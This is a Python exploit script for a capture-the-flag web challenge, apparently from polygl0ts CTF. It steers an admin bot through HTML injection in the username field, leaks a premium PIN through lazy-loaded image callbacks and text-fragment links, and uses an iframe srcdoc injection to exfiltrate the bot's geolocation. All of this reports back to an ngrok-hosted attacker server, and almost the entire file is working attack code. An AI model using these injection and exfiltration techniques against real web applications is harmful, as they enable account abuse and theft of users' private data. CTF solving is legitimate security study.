import ngrok
from flask import Flask, render_template, request, redirect, url_for
import socketio
from bs4 import BeautifulSoup as bs
import requests
import sys
import os
import sys

PORT = 1337
ngrok.set_auth_token("YOUR NGROK TOKEN"); attacker = ngrok.connect(PORT, "http").url() # plz no use/leak ty

if len(sys.argv) < 2:
  print("trying against default url")
  remote = "https://chall.polygl0ts.ch:9011"
else:
  remote = sys.argv[1]

sess = requests.Session()

res = sess.get(remote+"/register")
token = bs(res.text).find("b",{"id":"token"}).text
username = bs(res.text).find("b",{"id":"username"}).text
print("registered with token "+token+" and username "+username)

sio = socketio.Client()

@sio.event
def connect():
  print("connected")

@sio.event
def error(errormsg):
  print("error: "+errormsg)

@sio.event
def status(statusmsg):
  print("sio status: "+statusmsg)
  if statusmsg == "auth":
    sio.emit("auth",token)
  if statusmsg == "authFail":
    print("something went wrong")
    sys.exit(1)
  if statusmsg == "authSuccess":
    print("authed successfully")

@sio.event
def disconnect():
  print("disconnected")

adminUsername = None
duelId = None

import time
import random

def randomString(length):
  return "".join([chr(random.randint(97,122)) for _ in range(length)])

@sio.event
def notifications(notificationsMsg):
  if len(notificationsMsg) == 0:
    print("no new notifications")
    return
  newNotif = notificationsMsg[-1]
  print("new notification: "+newNotif)
  global adminUsername
  global duelId
  adminUsername = newNotif.split(" ")[0]
  duelId = newNotif.split("=")[-1].split("\"")[0]
  print("admin username is "+adminUsername)
  print("duel id is "+duelId)
  sendPayloads(["<a href=\""+attacker+"\">Click here to play!</a>"])

sio.connect(remote)

proxies = {"http":"127.0.0.1:8080"}
proxies = {}
END = False
def sendPayloads(payloads):
 if not END or not calm:
  sess.post(remote+"/updateUser",json={"username":randomString(10)}, proxies=proxies)
  for i in range(5-len(payloads)):
    sess.post(remote+"/challengeUser",json={"username":adminUsername,"duelID":duelId},proxies=proxies)
  for payload in payloads:
    sess.post(remote+"/updateUser",json={"username":payload+randomString(5)}, proxies=proxies)
    sess.post(remote+"/challengeUser",json={"username":adminUsername,"duelID":duelId},proxies=proxies)

app = Flask(__name__)
premiumPin = []


payload = ""

@app.route('/')
def index():
  return render_template('index.html')

@app.route('/x')
def x():
  return ""

@app.route('/stage2')
def stage2():
  return render_template('stage2.html', remote=remote)

current = 0
go = True
istherenew = False
@app.route('/wait')
def wait():
  global go
  global current
  global start
  global istherenew
  istherenew = True
  print(f"{current}/999")
  if time.time()-start > 50:
    current -= 2
    istherenew = False
    while True:
      print("hopefully new")
      sess.post(remote+"/updateUser",json={"username":username}, proxies=proxies)
      time.sleep(1)
      go = True
      startFunc()
      time.sleep(20)
      if istherenew:
        break
    return "stopitnow"
  for _ in range(30):
   if go:
    go = False
    sendPayloads(["" for _ in range(3)]+[str(current).zfill(3)+f" <img src='{attacker}/cb' loading='lazy'>",
                                         "<a href='/settings#:~:text="+str(current).zfill(3)+"'>Click here to play!</a>"])
    time.sleep(0.3)
    return ""
   else:
    time.sleep(0.1)
  if (time.time()-start < 47 and time.time()-start > 3 and not current in premiumPin and current != 0):
   premiumPin.append(str(current).zfill(3))
   print("current: "+str(premiumPin))
   if len(premiumPin) != 3:
    go = True
    current += 1
    return "sus"
   else:
    print("holyshit")
    for pin1 in premiumPin:
      for pin2 in premiumPin:
        for pin3 in premiumPin:
          if pin1 != pin2 and pin2 != pin3 and pin1 != pin3:
            pin = f"{pin1}-{pin2}-{pin3}"
            if sess.post(remote+"/updateUser",json={"username":randomString(10),"premiumPin":pin}, proxies=proxies).status_code != 401:
              print("found pin: "+pin)
              chalPayloadId = sess.post(remote+"/createChallenge",json={"latitude":1,"longitude":1,"img":1,"OpenLayersVersion":"1\" srcdoc='<iframe src="+attacker+"/geo allow=\"geolocation\"></iframe>'allow=\"geolocation","winText":"ay"}, proxies=proxies).text[1:-1]
              print("chalPayloadId is "+chalPayloadId)
              sendPayloads(["<a href='/challenge?id="+chalPayloadId+"'>Click here to play!</a>"])
              global END
              END = True
              time.sleep(1)
              return "geo"
  else:
    return "oof"

@app.route('/cb')
def cb():
  global current
  current += 1
  global go
  go = True
  return ""
calm = 1
@app.route('/geo')
def geo():
  global calm
  if calm == 1:
    calm = 0
    sendPayloads(["aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<!--"]*5)
    time.sleep(1)
  calm = True
  return render_template('geo.html')

@app.route('/exfil')
def exfil():
  lat = request.args.get('lat')
  lon = request.args.get('lon')
  print("flag is: "+sess.post(remote+"/solveChallenge", json={"challId":duelId,"latitude":lat,"longitude":lon}, proxies=proxies).text)
  sys.exit(0)
  return "end"


start = 0

def startFunc():
  global start
  start = time.time()
  try:
    sess.get(remote+"/bot?username="+username,proxies=proxies,timeout=0.001)
  except requests.exceptions.ReadTimeout:
      pass

if __name__ == '__main__':
  startFunc()
  app.run(host='0.0.0.0',port=PORT)
